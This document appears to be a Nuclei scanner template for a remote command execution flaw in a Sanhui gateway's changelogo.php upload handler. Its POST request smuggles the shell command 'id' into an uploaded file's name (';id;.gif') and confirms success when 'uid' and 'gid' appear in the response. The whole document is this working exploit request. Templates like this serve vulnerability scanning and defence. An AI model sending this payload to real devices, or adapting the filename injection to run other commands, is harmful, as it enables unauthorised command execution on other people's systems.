id: sanhui-gateway-changelogo-RCE

info:
  name: sanhui-gateway-changelogo-RCE
  author: iSee857
  severity: high
  description: sanhui-gateway-changelogo-RCE
  reference: 
    - https://github.com/iSee857
  tags: rce,sanhui,gateway

http:
  - method: POST
    path:
      - "{{BaseURL}}/changelogo.php"

    headers:
      Host: "{{Host}}"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
      Accept-Encoding: "gzip, deflate, br"
      Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
      Connection: "keep-alive"
      Content-Type: "multipart/form-data; boundary=---------------------------136689467536665089023051840895"
      Upgrade-Insecure-Requests: "1"

    body: |-
      -----------------------------136689467536665089023051840895
      Content-Disposition: form-data; name="file"; filename=";id;.gif"
      Content-Type: image/gif

      123321

      -----------------------------136689467536665089023051840895
      Content-Disposition: form-data; name="test"


      -----------------------------136689467536665089023051840895
      Content-Disposition: form-data; name="upload"

      Apply
      -----------------------------136689467536665089023051840895--

    matchers:
      - type: word
        words:
          - "uid"
          - "gid"          
        part: body
        condition: and

      - type: status
        status:
          - 200

    matchers-condition: and
    redirects: false
    max-redirects: 0
    cookie-reuse: true
    unsafe: true
    max-size: 2048